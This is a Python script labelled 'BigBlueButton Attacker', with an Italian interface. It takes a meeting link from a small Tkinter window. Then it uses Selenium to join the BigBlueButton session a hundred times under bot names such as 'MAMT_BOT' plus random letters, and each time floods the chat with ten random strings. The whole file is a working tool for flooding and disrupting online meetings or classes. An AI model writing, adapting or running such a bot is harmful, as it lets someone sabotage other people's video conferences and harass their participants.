from tkinter import *
from tkinter import ttk
import tkinter as tk
from selenium.webdriver.common.keys import Keys
from selenium import webdriver
import random
import string
import time
contatore = 0
url = ""
window = tk.Tk()

window.title("BigBlueButton Attacker")
window.minsize(150, 50)
window.resizable(False, False)


def clickMe():
    url = name.get()
    window.quit()
    print(url)


label = ttk.Label(window, text="Inserisci Il Link da attaccare")
label.grid(column=0, row=0)
label.place(relx=0.13, rely=0.3, anchor=NW)


name = tk.StringVar()
nameEntered = ttk.Entry(window, width=30, textvariable=name)
nameEntered.grid(column=0, row=1)
nameEntered.place(relx=0.5, rely=0.5, anchor=CENTER)

button = ttk.Button(window, text="Attack", command=clickMe)
button.grid(column=0, row=2)
button.place(relx=0.5, rely=0.7, anchor=CENTER)
window.mainloop()


def randomString(stringLength=10):
    """Generate a random string of fixed length """
    letters = string.ascii_lowercase
    return ''.join(random.choice(letters) for i in range(stringLength))


def function():
    spamming = 0
    browser = webdriver.Chrome('/Users/Silvano/Desktop/chromedriver.exe')
    url = name.get()
    browser.get(url)
    elem = browser.find_elements_by_xpath(
        "//input[@required='required' and @class='form-control join-form']")[0]
    elem.send_keys('MAMT_BOT ' + randomString(6))
    elem.send_keys(Keys.ENTER)
    time.sleep(5)
    python_button = browser.find_elements_by_xpath(
        "//button[@aria-label='Modalità ascoltatore' and @aria-disabled='false']")[0]
    python_button.click()
    time.sleep(1)
    spam = browser.find_elements_by_xpath("//textarea[@id='message-input']")[0]
    spam.send_keys(randomString(20))
    spam.send_keys(Keys.ENTER)
    spam.send_keys(randomString(20))
    spam.send_keys(Keys.ENTER)
    spam.send_keys(randomString(20))
    spam.send_keys(Keys.ENTER)
    spam.send_keys(randomString(20))
    spam.send_keys(Keys.ENTER)
    spam.send_keys(randomString(20))
    spam.send_keys(Keys.ENTER)
    spam.send_keys(randomString(20))
    spam.send_keys(Keys.ENTER)
    spam.send_keys(randomString(20))
    spam.send_keys(Keys.ENTER)
    spam.send_keys(randomString(20))
    spam.send_keys(Keys.ENTER)
    spam.send_keys(randomString(20))
    spam.send_keys(Keys.ENTER)
    spam.send_keys(randomString(20))
    spam.send_keys(Keys.ENTER)


while contatore < 100:
    function()
    contatore += 1
